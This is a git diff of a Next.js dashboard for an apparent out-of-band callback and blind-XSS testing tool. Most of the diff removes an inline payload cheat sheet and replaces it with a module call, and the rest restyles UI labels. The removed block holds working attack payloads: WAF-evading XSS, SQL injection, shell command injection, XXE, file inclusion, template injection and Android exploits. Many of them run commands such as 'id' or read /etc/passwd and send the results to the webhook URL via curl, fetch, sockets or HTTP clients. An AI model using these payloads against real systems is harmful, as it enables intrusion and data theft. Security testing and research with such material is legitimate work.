@@ -1,6 +1,6 @@
 'use client';
 
-import { useState, useEffect, use, useRef } from 'react';
+import { useState, useEffect, use, useRef, useMemo } from 'react';
 import Link from 'next/link';
 import { 
   Webhook, ChevronRight, Copy, Check, Settings, Trash2, Send, 
@@ -9,6 +9,7 @@ import {
   Database, User, Network, FileCode, Radio, Terminal, Zap,
   ShieldCheck, Cpu, BookOpen
 } from 'lucide-react';
+import { getPayloadsData } from '@/lib/payloads';
 import styles from '@/styles/dashboard.module.css';
 
 // SSRF Bypass Payload Generator Helper
@@ -519,521 +520,10 @@ export default function DashboardPage({ params }) {
     );
   });
 
-  // Payloads Cheat Sheet Library (Pre-Configured dynamically with custom URLs!)
-  const payloadsData = [
-    {
-      category: 'XSS',
-      title: 'Cross-Site Scripting (XSS)',
-      items: [
-        { 
-          title: 'Dynamic Blind XSS Payload (2026 Stealth)', 
-          code: `top['ev'+'al']('import(\\\"${xssPayloadUrl}\\\")')`, 
-          desc: 'Evades keyword engines looking for evaluation parameters and alert brackets. Uses ES6 dynamic chunked importing.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Browser JS / HTML'
-        },
-        { 
-          title: 'MathML onbegin Animation Injection', 
-          code: `<svg><animate onbegin="import('${xssPayloadUrl}')" attributeName="x"></svg>`, 
-          desc: 'Triggered instantly during DOM building without using standard elements like <img> or <body>. Bypasses classic HTML parsers.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Browser JS / MathML'
-        },
-        { 
-          title: 'Custom Elements with Shadow DOM clicking', 
-          code: `<x-xss id=x onclick="eval(atob('${typeof btoa !== 'undefined' ? btoa(`import('${xssPayloadUrl}')`) : 'aW1wb3J0KCd4c3MnKQ=='}'))">click</x-xss>`, 
-          desc: 'Bypasses WAF regexes that inspect classic HTML elements. Obfuscates javascript commands inside base64 decoding.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Browser JS / Shadow DOM'
-        },
-        { 
-          title: 'Fetch External JavaScript Eval Bypass', 
-          code: `fetch('${xssPayloadUrl}').then(r=>r.text()).then(t=>top['ev'+'al'](t))`, 
-          desc: 'Using fetch API instead of standard script tags. Completely evades script filters by pulling and evaluating code inside window scope.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Browser JS / APIs'
-        },
-        { 
-          title: 'Iframe Source Document script execution', 
-          code: `<iframe srcdoc="&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x69;&#x6D;&#x70;&#x6F;&#x72;&#x74;&#x28;&#x27;${xssPayloadUrl}&#x27;&#x29;&#x3C;&#x2F;&#x33;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;"></iframe>`, 
-          desc: 'An iframe with html-entity encoded source document script element. Completely unreadable to WAF regex filters.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Browser JS / Iframe'
-        },
-        { 
-          title: 'HTML5 Image Tag Error Fallback', 
-          code: `<img src=x onerror="import('${xssPayloadUrl}').catch(e=>{})">`, 
-          desc: 'Standard HTML5 event bypass. Uses ES6 import to load external script.',
-          priority: 'MEDIUM', 
-          era: 'Standard Bypass',
-          tech: 'HTML5 / JS'
-        },
-        { 
-          title: 'Anchor Tag javascript URI pseudo-protocol', 
-          code: `<a href="javascript:import('${xssPayloadUrl}')">Click for reward</a>`, 
-          desc: 'Requires user interaction. Useful for stored social engineering / link injection attacks in markdown comments.',
-          priority: 'MEDIUM', 
-          era: 'Standard Bypass',
-          tech: 'HTML / JS'
-        },
-        { 
-          title: 'Input Element autofocus handler', 
-          code: `<input autofocus onfocus="import('${xssPayloadUrl}')">`, 
-          desc: 'Bypasses filters blocking onload/onerror handlers by exploiting auto-focusing elements.',
-          priority: 'MEDIUM', 
-          era: 'Standard Bypass',
-          tech: 'HTML5 / JS'
-        },
-        { 
-          title: 'Simple Image Source alert (Zaman Batu)', 
-          code: `<img src=x onerror=alert(1)>`, 
-          desc: 'The absolute classic. High detection rates but perfect for checking standard unfiltered entry points.',
-          priority: 'LOW', 
-          era: 'Zaman Batu (Classic)',
-          tech: 'HTML / JS'
-        },
-        { 
-          title: 'Raw Script tag (Zaman Batu)', 
-          code: `<script>alert(1)</script>`, 
-          desc: 'Pure legacy script block. Blocked by 99% of WAFs, but still useful to check local offline databases.',
-          priority: 'LOW', 
-          era: 'Zaman Batu (Classic)',
-          tech: 'HTML / Script Tag'
-        }
-      ]
-    },
-    {
-      category: 'SQLI',
-      title: 'SQL Injection (SQLi)',
-      items: [
-        { 
-          title: 'MySQL Space-less Filter Bypass', 
-          code: `'/**/UNION/**/SELECT/**/1,2,user(),4,5--`, 
-          desc: 'Replaces whitespace characters with empty C-style block comments to confuse regex space triggers.',
-          priority: 'HIGH', 
-          era: 'WAF Bypass',
-          tech: 'MySQL / Aurora'
-        },
-        { 
-          title: 'Scientific Notation Arithmetic', 
-          code: `1e0' OR 1.0=1.0--`, 
-          desc: 'Translates query conditions into exponential mathematics to completely bypass simple numeric comparison rules.',
-          priority: 'HIGH', 
-          era: 'WAF Bypass',
-          tech: 'MySQL / PostgreSQL'
-        },
-        { 
-          title: 'Heavy Query Time-Based Exfiltration (MySQL)', 
-          code: `' OR (SELECT 1 FROM (SELECT(SLEEP(5)))x)--`, 
-          desc: 'Time-delay based validation. Perfect for checking blind SQL injection points without utilizing noisy syntax strings.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'MySQL / MariaDB'
-        },
-        { 
-          title: 'PostgreSQL Time-Based Stacked Query', 
-          code: `';COPY (SELECT '') TO PROGRAM 'curl ${webhookUrl}/pg_rce'--`, 
-          desc: 'Requires database admin superuser privileges. Performs an out-of-band RCE using postgres dynamic command shell execution.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'PostgreSQL / Linux'
-        },
-        { 
-          title: 'Hexadecimal String Injection', 
-          code: `0x61646d696e`, 
-          desc: 'Bypasses quote filtering by translating SQL string constraints directly to base-16 hexadecimal literals.',
-          priority: 'MEDIUM', 
-          era: 'Standard Bypass',
-          tech: 'MySQL / SQLite'
-        },
-        { 
-          title: 'Database Version String Concatenation', 
-          code: `' UNION SELECT NULL,@@version,NULL,NULL--`, 
-          desc: 'Retrieves server engine distribution context. Relies on standard UNION extraction vectors.',
-          priority: 'MEDIUM', 
-          era: 'Standard Bypass',
-          tech: 'MySQL / SQL Server'
-        },
-        { 
-          title: 'Simple Authentication Bypass (Zaman Batu)', 
-          code: `' OR 1=1--`, 
-          desc: 'Standard query comparison override. High detection rates but classic logic.',
-          priority: 'LOW', 
-          era: 'Zaman Batu (Classic)',
-          tech: 'SQL Databases'
-        },
-        { 
-          title: 'Basic Admin Single-Quote (Zaman Batu)', 
-          code: `admin'--`, 
-          desc: 'Standard string parameter termination, useful for primitive login portals.',
-          priority: 'LOW', 
-          era: 'Zaman Batu (Classic)',
-          tech: 'SQL Databases'
-        }
-      ]
-    },
-    {
-      category: 'RCE',
-      title: 'Command Injection (RCE)',
-      items: [
-        { 
-          title: 'Bash IFS & Single Quote Splitting', 
-          code: `c'a't$IFS/e't'c/p'a's's'wd`, 
-          desc: 'Bypasses literal string matches (like "cat" and "/etc/passwd") and space triggers using single quotes and internal field separators.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Unix Shell / Bash'
-        },
-        { 
-          title: 'Bash Path Wildcards', 
-          code: `/bi?/c*t$IFS/et?/pa??wd`, 
-          desc: 'Triggers commands using directory wildcard expansion matching, evading keyword filters.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Unix Shell / Alpine'
-        },
-        { 
-          title: 'Bash Empty Uninitialized variable bypass', 
-          code: `ca$@t$IFS/etc/pass$@wd`, 
-          desc: 'Bash automatically strips empty variables (`$@`) before executing commands, rendering string signatures useless.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Unix Shell / Bash'
-        },
-        { 
-          title: 'Hex-Encoded Command Pipeline Execution', 
-          code: `$(echo -e "\\x63\\x61\\x74") $IFS /etc/passwd`, 
-          desc: 'Converts target command binary names into hexadecimal bytes, evaluating them on the fly at shell execution.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Unix Shell / Linux'
-        },
-        { 
-          title: 'Base64 Decoded Pipeline', 
-          code: `echo$IFS'Y2F0IC9ldGMvcGFzc3dk'$IFS|$IFS'base64'$IFS'-d'$IFS|$IFS'bash'`, 
-          desc: 'Decodes a base64 string on the fly and pipes it to bash, keeping keywords completely hidden from firewalls.',
-          priority: 'MEDIUM', 
-          era: 'Standard Bypass',
-          tech: 'Unix Shell / Linux'
-        },
-        { 
-          title: 'Backtick subshell command substitution', 
-          code: `\`id\``, 
-          desc: 'Executes nested target parameters inside modern shell configurations.',
-          priority: 'MEDIUM', 
-          era: 'Standard Bypass',
-          tech: 'Linux / Unix Shell'
-        },
-        { 
-          title: 'Simple cURL Command (Zaman Batu)', 
-          code: `; curl ${webhookUrl}`, 
-          desc: 'Raw cURL request. Easily detected by simple WAF rules looking for outbound HTTP keywords.',
-          priority: 'LOW', 
-          era: 'Zaman Batu (Classic)',
-          tech: 'Linux / macOS'
-        },
-        { 
-          title: 'Basic Semicolon Divider (Zaman Batu)', 
-          code: `; id`, 
-          desc: 'Direct parameter append execution. Easily blocked by character filter rules.',
-          priority: 'LOW', 
-          era: 'Zaman Batu (Classic)',
-          tech: 'Linux / Windows'
-        }
-      ]
-    },
-    {
-      category: 'XXE',
-      title: 'XML External Entity (XXE)',
-      items: [
-        { 
-          title: 'UTF-16 BE Document encoding', 
-          code: `[Convert XML to UTF-16 BE encoding bytes]`, 
-          desc: 'Sending XML document parameters encoded in UTF-16 Big Endian completely blinds WAFs that inspect UTF-8 traffic, while parser parses it normally.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Java / Python XML'
-        },
-        { 
-          title: 'Nested Parameter Entities Blind Call', 
-          code: `<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "${webhookUrl}/poc.dtd">%dtd;]><foo>&send;</foo>`, 
-          desc: 'Uses external malicious DTD rules to parse local files and exfiltrate variables to OOB host.',
-          priority: 'HIGH', 
-          era: 'WAF Bypass',
-          tech: 'Java / .NET / PHP XML'
-        },
-        { 
-          title: 'XML Entity Parameter Dynamic Exfiltration', 
-          code: `<!ENTITY % pay SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">`, 
-          desc: 'Uses PHP filter streams to base64-encode sensitive local system files before passing them outwards to OOB endpoint, preventing parser errors.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'PHP XML / Ingestion'
-        },
-        { 
-          title: 'Standard External General Entity Resource', 
-          code: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "${webhookUrl}">]><foo>&xxe;</foo>`, 
-          desc: 'Pings back OOB listener URL instantly when XML document gets evaluated on server endpoint.',
-          priority: 'MEDIUM', 
-          era: 'Standard Bypass',
-          tech: 'XML Parser'
-        },
-        { 
-          title: 'Classic Local File Traversal (Zaman Batu)', 
-          code: `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY x SYSTEM "file:///etc/passwd">]><x>&x;</x>`, 
-          desc: 'Standard local file reading. Easily blocked by any basic rule inspecting external system keywords.',
-          priority: 'LOW', 
-          era: 'Zaman Batu (Classic)',
-          tech: 'XML Parser'
-        }
-      ]
-    },
-    {
-      category: 'LFI',
-      title: 'Local File Inclusion (LFI)',
-      items: [
-        { 
-          title: 'Modern PHP Filter String Chaining (RCE)', 
-          code: `php://filter/convert.iconv.UTF8.CSISO2022KR/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==`, 
-          desc: 'Utilizes base64 stream transformations to dynamically assemble web shell components directly in execution memory, avoiding file writes.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'PHP Engine'
-        },
-        { 
-          title: 'Multi-Byte Unicode Slash Traversal', 
-          code: `..%c0%af..%c0%af..%c0%afetc/passwd`, 
-          desc: 'Evades standard traversal matchers on vulnerable servers utilizing UTF-8 character normalization.',
-          priority: 'HIGH', 
-          era: 'WAF Bypass',
-          tech: 'IIS / Nginx / Apache'
-        },
-        { 
-          title: 'PHP Bzip2 Decompression Wrapper', 
-          code: `compress.bzip2://../../etc/passwd`, 
-          desc: 'Using alternative file compression wrappers instead of file:// protocols to access operating system files.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'PHP Engine'
-        },
-        { 
-          title: 'Double URL Encoded Traversal', 
-          code: `%252e%252e%252f%252e%252e%252fetc/passwd`, 
-          desc: 'Evades WAFs that decode URLs only once. Standard double percent escapes.',
-          priority: 'MEDIUM', 
-          era: 'Standard Bypass',
-          tech: 'Apache / Tomcat'
-        },
-        { 
-          title: 'Null Byte Traversal (PHP < 5.3.4)', 
-          code: `../../../../../../etc/passwd%00`, 
-          desc: 'Utilizes a null byte escape to strip system file extensions. Useful for older legacy systems.',
-          priority: 'MEDIUM', 
-          era: 'Standard Bypass',
-          tech: 'PHP Legacy Engine'
-        },
-        { 
-          title: 'wkhtmltopdf SSRF & LFI Local File Disclosure (Iframe)', 
-          code: `<iframe src="file:///etc/passwd" width="100%" height="500px"></iframe>`, 
-          desc: 'Exploits wkhtmltopdf HTML-to-PDF converters that compile local file:// URLs, rendering the local file contents directly inside the generated PDF.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'wkhtmltopdf Engine'
-        },
-        { 
-          title: 'wkhtmltopdf LFI Dynamic JavaScript File Exfiltration', 
-          code: `<script>x=new XMLHttpRequest();x.onload=function(){fetch('${webhookUrl}/?lfi='+btoa(this.responseText))};x.open('GET','file:///etc/passwd');x.send();</script>`, 
-          desc: 'Leverages wkhtmltopdf JavaScript execution support. Spawns an AJAX request to read local files and exfiltrate the contents via base64 directly to your webhook listener.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'wkhtmltopdf / JS Engine'
-        },
-        { 
-          title: 'Standard dot-dot-slash (Zaman Batu)', 
-          code: `../../../../../../etc/passwd`, 
-          desc: 'Classic Unix directory traversal. Blocked by default on virtually all modern systems.',
-          priority: 'LOW', 
-          era: 'Zaman Batu (Classic)',
-          tech: 'Linux Filesystem'
-        }
-      ]
-    },
-    {
-      category: 'SSTI',
-      title: 'Server-Side Template Injection (SSTI)',
-      items: [
-        { 
-          title: 'Jinja2 String Split Attribute Reflection', 
-          code: `{{request['__cl'+'ass__']['__bas'+'es__'][0]['__subcl'+'asses__']()}}`, 
-          desc: 'Evades static code rules that scan parameters for the explicit presence of string terms like "__class__".',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Python / Flask / Jinja2'
-        },
-        { 
-          title: 'Jinja2 Hex Filters Evaluation', 
-          code: `{{request|attr('__cla'+'ss__')|attr('__bas'+'es__')}}`, 
-          desc: 'Combines dynamic attribute getters with string splits to access restricted sandbox scopes.',
-          priority: 'HIGH', 
-          era: 'WAF Bypass',
-          tech: 'Python / Flask / Jinja2'
-        },
-        { 
-          title: 'Jinja2 Query Parameter String execution (No Quotes)', 
-          code: `{{request|attr(request.args.c)}}&c=__class__`, 
-          desc: 'Leverages other HTTP query arguments to fetch and resolve reserved words dynamically, avoiding quotes inside injection fields.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Python / Flask / Jinja2'
-        },
-        { 
-          title: 'Tornado Template Application RCE', 
-          code: `{{import os;os.system('id')}}`, 
-          desc: 'Direct import capabilities inside vulnerable Python Tornado web servers.',
-          priority: 'MEDIUM', 
-          era: 'Standard Bypass',
-          tech: 'Python / Tornado Server'
-        },
-        { 
-          title: 'Basic Curly Expression (Zaman Batu)', 
-          code: `{{7*7}}`, 
-          desc: 'Simple calculation testing. Used to easily verify if any template parsing engine is active.',
-          priority: 'LOW', 
-          era: 'Zaman Batu (Classic)',
-          tech: 'Template Engines'
-        }
-      ]
-    },
-    {
-      category: 'LANG',
-      title: 'OOB Exfiltration Codes by Language (Python, Go, Java, Node, .NET)',
-      items: [
-        { 
-          title: 'Go (Golang) Stealth OOB HTTP Exfiltrator', 
-          code: `package main; import ("net/http"; "os/exec"); func main() { out, _ := exec.Command("id").Output(); http.Get("${webhookUrl}/?data=" + string(out)) }`, 
-          desc: 'Native Go code compilation to run commands silently in background context and exfiltrate base bytes to your webhook endpoint.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Go / Golang SDK'
-        },
-        { 
-          title: 'Python Socket Dynamic Connection Pinger', 
-          code: `import socket, subprocess; s = socket.socket(); s.connect(('${webhookUrl.replace(/^https?:\/\//i, '').split('/')[0]}', 80)); s.send(b'GET /api/r/${id}?ping=python_raw HTTP/1.1\\r\\nHost: ${webhookUrl.replace(/^https?:\/\//i, '').split('/')[0]}\\r\\n\\r\\n')`, 
-          desc: 'Uses Python socket libraries to directly craft raw HTTP handshakes to your webhook, completely bypassing system proxies, SSL checks, and curl logging.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Python 3.x Engine'
-        },
-        { 
-          title: 'Python Out-of-band Subprocess fetcher', 
-          code: `import urllib.request, subprocess; r = subprocess.check_output('id', shell=True); urllib.request.urlopen(f'${webhookUrl}/?res=' + r.decode('utf-8'))`, 
-          desc: 'Standard Python urllib dynamic transmission vector. Highly reliable for server script executions.',
-          priority: 'MEDIUM', 
-          era: 'Standard Bypass',
-          tech: 'Python 3.x Engine'
-        },
-        { 
-          title: 'Java Runtime Out-of-Band Callback execution', 
-          code: `Runtime.getRuntime().exec(new String[]{"sh", "-c", "curl ${webhookUrl}/?user=" + System.getProperty("user.name")});`, 
-          desc: 'Native Java process string executing commands and piping metadata properties back to your OOB interface.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Java / JDK / JVM'
-        },
-        { 
-          title: 'Java ProcessBuilder Base64 exfiltration', 
-          code: `new ProcessBuilder("sh", "-c", "echo $(id) | base64 | xargs -I {} curl ${webhookUrl}/?id={}").start();`, 
-          desc: 'Constructs isolated background subprocess pipelines to encode critical identities before exfiltration.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Java Runtime Environment'
-        },
-        { 
-          title: 'Node.js Dynamic Worker Import Pinger', 
-          code: `require('child_process').exec('id', (e, out) => { require('https').get('${webhookUrl}/?node=' + encodeURIComponent(out)) });`, 
-          desc: 'Node.js asynchronous child process callback wrapper triggering out-of-band TLS request callbacks.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Node.js Runtime / ES6'
-        },
-        { 
-          title: 'Node.js Fetch ES Module exfiltration', 
-          code: `import('child_process').then(cp => cp.exec('id', (e,o) => fetch('${webhookUrl}/?node='+o)))`, 
-          desc: 'Modern Node.js syntax utilizing Dynamic imports and standard fetch API structures.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Node.js ES6+ / V8 Engine'
-        },
-        { 
-          title: '.NET Core C# Process Pipeline Exfiltration', 
-          code: `using System.Diagnostics; using System.Net.Http; var p = Process.Start(new ProcessStartInfo("whoami") { RedirectStandardOutput = true }); p.WaitForExit(); new HttpClient().GetStringAsync("${webhookUrl}/?win=" + p.StandardOutput.ReadToEnd());`, 
-          desc: 'Explicit .NET Core compiler script initiating system shell operations, capturing raw stdout streams and broadcasting payloads.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: '.NET Core / C# v10+'
-        },
-        { 
-          title: '.NET Core Background WebClient ping', 
-          code: `new System.Net.WebClient().DownloadString("${webhookUrl}/?ping=.net_core_handshake");`, 
-          desc: 'Primitive out-of-band handshake validation. Highly efficient for rapid framework checking.',
-          priority: 'MEDIUM', 
-          era: 'Standard Bypass',
-          tech: '.NET Framework / C#'
-        }
-      ]
-    },
-    {
-      category: 'ANDROID',
-      title: 'Android Vulnerability Testing (Deep Links, Intents, WebViews)',
-      items: [
-        { 
-          title: 'Android WebView JavaScriptInterface Bridge Remote Code Execution', 
-          code: `<script>if(window.Android) { const res = window.Android.executeCommand("id"); fetch('${webhookUrl}/?android_bridge=' + encodeURIComponent(res)); }</script>`, 
-          desc: 'Exploits insecurely exposed Java classes inside Android WebViews annotated with @JavascriptInterface to exfiltrate execution output back to your listener.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Android SDK / Java WebView'
-        },
-        { 
-          title: 'Android Deep Link Hijacking Scheme Exfiltration', 
-          code: `adb shell am start -W -a android.intent.action.VIEW -d "myapp://credentials?token=exfiltrated_key&redirect=${webhookUrl}"`, 
-          desc: 'Simulates a deep-link hijack via Android ADB shell. Intercepts private access tokens and broadcasts them to your external webhook receiver.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Android OS / ADB Shell'
-        },
-        { 
-          title: 'Android Intent Redirection Private File Extraction', 
-          code: `Intent i = new Intent(); i.setClassName("com.target.app", "com.target.app.WebViewActivity"); i.putExtra("url", "file:///data/data/com.target.app/shared_prefs/user_session.xml"); i.putExtra("callback", "${webhookUrl}");`, 
-          desc: 'C# / Java Android mock payload targeting unprotected exported activities to force-read internal application shared preferences and broadcast outwards.',
-          priority: 'HIGH', 
-          era: '2026 Stealth',
-          tech: 'Android Java / Kotlin'
-        },
-        { 
-          title: 'Android WebView Local File Access Overriding (LFA)', 
-          code: `webView.getSettings().setAllowFileAccess(true); webView.getSettings().setAllowUniversalAccessFromFileURLs(true);`, 
-          desc: 'Critical misconfiguration in Android WebViews allowing attackers to use file:// URLs to read arbitrary local app files and perform cross-origin requests.',
-          priority: 'MEDIUM', 
-          era: 'Standard Bypass',
-          tech: 'Android WebView Settings'
-        },
-        { 
-          title: 'Android Cleartext Traffic Insecure Permissive Policy', 
-          code: `<application android:usesCleartextTraffic="true"> ... </application>`, 
-          desc: 'Detects lack of SSL/TLS transport security in Android manifest, facilitating active interceptor logging of requests on standard HTTP protocol.',
-          priority: 'LOW', 
-          era: 'Zaman Batu (Classic)',
-          tech: 'Android Manifest XML'
-        }
-      ]
-    }
-  ];
+  // Payloads Cheat Sheet Library (Modularized via @/lib/payloads)
+  const payloadsData = useMemo(() => {
+    return getPayloadsData({ webhookUrl, xssPayloadUrl, webhookHost, id });
+  }, [webhookUrl, xssPayloadUrl, webhookHost, id]);
 
   // Filter Payloads list based on search, category AND Priority Era levels
   const filteredPayloads = payloadsData.filter(cat => {
@@ -1063,9 +553,9 @@ export default function DashboardPage({ params }) {
         <div className={styles.sidebarHeader}>
           <div className={styles.sidebarTitleRow}>
             <Link href="/" className={styles.logoRow}>
-              <ArrowLeft size={16} style={{ color: 'var(--text-muted)' }} />
-              <Terminal size={16} className={styles.logoIcon} style={{ color: '#00e676' }} />
-              <span className={styles.logoText} style={{ color: '#00e676', fontSize: '0.85rem', letterSpacing: '0.5px' }}>kestrel_ghost</span>
+              <ArrowLeft size={16} />
+              <Terminal size={15} className={styles.logoIcon} />
+              <span className={styles.logoText}>Webhook Inspector</span>
             </Link>
             <span className={styles.sidebarStats}>
               {activeTab === 'OOB' 
@@ -1073,9 +563,9 @@ export default function DashboardPage({ params }) {
                 : activeTab === 'XSS' 
                 ? `${xssTriggers.length} XSS Hits` 
                 : activeTab === 'PAYLOADS'
-                ? 'Cheat Sheet'
+                ? 'Payloads'
                 : activeTab === 'NUCLEI'
-                ? 'Nuclei Suite'
+                ? 'Nuclei'
                 : 'Utility'}
             </span>
           </div>
@@ -1101,7 +591,7 @@ export default function DashboardPage({ params }) {
             <button 
               onClick={() => setActiveTab('SSRF')}
               className={`${styles.moduleTabBtn} ${activeTab === 'SSRF' ? styles.moduleTabBtnActive : ''}`}
-              title="Stealth SSRF Bypass Generator"
+              title="SSRF Bypass Generator"
             >
               <Zap size={13} />
               SSRF
@@ -1109,7 +599,7 @@ export default function DashboardPage({ params }) {
             <button 
               onClick={() => setActiveTab('PAYLOADS')}
               className={`${styles.moduleTabBtn} ${activeTab === 'PAYLOADS' ? styles.moduleTabBtnActive : ''}`}
-              title="Tactical Payloads Library"
+              title="Payload Library"
             >
               <BookOpen size={13} />
               Payloads
@@ -1117,7 +607,7 @@ export default function DashboardPage({ params }) {
             <button 
               onClick={() => setActiveTab('NUCLEI')}
               className={`${styles.moduleTabBtn} ${activeTab === 'NUCLEI' ? styles.moduleTabBtnActive : ''}`}
-              title="Nuclei OOB & Automation Suite"
+              title="Nuclei Integration & Templates"
             >
               <Cpu size={13} />
               Nuclei
@@ -1138,19 +628,12 @@ export default function DashboardPage({ params }) {
                 />
               </div>
 
-              <div style={{ display: 'flex', gap: '4px', overflowX: 'auto', paddingBottom: '4px' }}>
+              <div className={styles.filterPillsRow}>
                 {['ALL', 'GET', 'POST', 'PUT', 'DELETE'].map(method => (
                   <button
                     key={method}
                     onClick={() => setFilterMethod(method)}
-                    className={`badge ${filterMethod === method ? 'badge-info' : ''}`}
-                    style={{ 
-                      cursor: 'pointer', 
-                      fontSize: '0.6rem',
-                      border: filterMethod === method ? '1px solid var(--color-primary)' : '1px solid transparent',
-                      background: filterMethod === method ? 'var(--color-primary-glow)' : 'transparent',
-                      color: filterMethod === method ? 'var(--color-primary)' : 'var(--text-muted)'
-                    }}
+                    className={`${styles.filterPill} ${filterMethod === method ? styles.filterPillActive : ''}`}
                   >
                     {method}
                   </button>
@@ -1173,8 +656,8 @@ export default function DashboardPage({ params }) {
           )}
 
           {activeTab === 'SSRF' && (
-            <div style={{ fontSize: '0.75rem', color: 'var(--text-muted)', lineHeight: '1.4' }}>
-              🎯 Enter target host below. Changes trigger real-time, pre-compiled bypass lists instantly.
+            <div style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', lineHeight: '1.4' }}>
+              Enter a target host in the main panel to generate bypass representations in real-time.
             </div>
           )}
 
@@ -1184,7 +667,7 @@ export default function DashboardPage({ params }) {
                 <Search size={14} className={styles.searchIcon} />
                 <input 
                   type="text" 
-                  placeholder="Search tactical payloads..."
+                  placeholder="Search payloads..."
                   value={payloadsSearchQuery}
                   onChange={(e) => setPayloadsSearchQuery(e.target.value)}
                   className={styles.searchInput}
@@ -1192,33 +675,17 @@ export default function DashboardPage({ params }) {
               </div>
 
               {/* Priority Filter badging switcher inside sidebar */}
-              <div style={{ display: 'flex', gap: '4px', overflowX: 'auto', paddingBottom: '4px' }}>
+              <div className={styles.filterPillsRow}>
                 {[
-                  { id: 'ALL', label: 'All Tiers' },
-                  { id: 'HIGH', label: '🔥 2026 Stealth' },
-                  { id: 'MEDIUM', label: '⚡ WAF Bypass' },
-                  { id: 'LOW', label: '🪨 Zaman Batu' }
+                  { id: 'ALL', label: 'All Severities' },
+                  { id: 'HIGH', label: 'High Priority' },
+                  { id: 'MEDIUM', label: 'WAF Bypass' },
+                  { id: 'LOW', label: 'Legacy / Standard' }
                 ].map(prio => (
                   <button
                     key={prio.id}
                     onClick={() => setPayloadFilterPriority(prio.id)}
-                    className={`badge`}
-                    style={{ 
-                      cursor: 'pointer', 
-                      fontSize: '0.58rem',
-                      padding: '4px 6px',
-                      borderRadius: '4px',
-                      whiteSpace: 'nowrap',
-                      border: payloadFilterPriority === prio.id 
-                        ? '1px solid var(--color-primary)' 
-                        : '1px solid rgba(255,255,255,0.05)',
-                      background: payloadFilterPriority === prio.id 
-                        ? 'var(--color-primary-glow)' 
-                        : 'rgba(0,0,0,0.2)',
-                      color: payloadFilterPriority === prio.id 
-                        ? 'var(--color-primary)' 
-                        : 'var(--text-muted)'
-                    }}
+                    className={`${styles.filterPill} ${payloadFilterPriority === prio.id ? styles.filterPillActive : ''}`}
                   >
                     {prio.label}
                   </button>
@@ -1240,9 +707,9 @@ export default function DashboardPage({ params }) {
                 />
               </div>
 
-              <div style={{ fontSize: '0.72rem', color: 'var(--text-muted)', display: 'flex', alignItems: 'center', gap: '6px' }}>
-                <Cpu size={12} style={{ color: '#00e676' }} />
-                <span>ProjectDiscovery Nuclei Suite</span>
+              <div style={{ fontSize: '0.72rem', color: 'var(--text-secondary)', display: 'flex', alignItems: 'center', gap: '6px' }}>
+                <Cpu size={12} style={{ color: 'var(--color-primary)' }} />
+                <span>Nuclei Automation Suite</span>
               </div>
             </>
           )}
@@ -1253,11 +720,11 @@ export default function DashboardPage({ params }) {
           {activeTab === 'OOB' && (
             filteredRequests.length === 0 ? (
               <div className={styles.emptySidebar}>
-                <HelpCircle size={32} style={{ color: 'var(--text-dark)' }} />
+                <HelpCircle size={28} style={{ color: 'var(--text-muted)' }} />
                 <p className={styles.emptySidebarText}>
                   {searchQuery || filterMethod !== 'ALL' 
-                    ? 'No callback logs match filter criteria.' 
-                    : 'Awaiting network callbacks...'}
+                    ? 'No requests match filter criteria.' 
+                    : 'Awaiting incoming requests...'}
                 </p>
               </div>
             ) : (
@@ -1284,7 +751,7 @@ export default function DashboardPage({ params }) {
                       <span>{req.size > 1024 ? `${(req.size / 1024).toFixed(1)} KB` : `${req.size} B`}</span>
                     </div>
                   </div>
-                  <ChevronRight size={14} style={{ color: 'var(--text-dark)', alignSelf: 'center' }} />
+                  <ChevronRight size={14} style={{ color: 'var(--text-muted)', alignSelf: 'center' }} />
                 </div>
               ))
             )
@@ -1293,9 +760,9 @@ export default function DashboardPage({ params }) {
           {activeTab === 'XSS' && (
             filteredXssTriggers.length === 0 ? (
               <div className={styles.emptySidebar}>
-                <ShieldAlert size={32} style={{ color: 'var(--text-dark)' }} />
+                <ShieldAlert size={28} style={{ color: 'var(--text-muted)' }} />
                 <p className={styles.emptySidebarText}>
-                  Awaiting Blind XSS callbacks on your payloads...
+                  Awaiting Blind XSS triggers...
                 </p>
               </div>
             ) : (
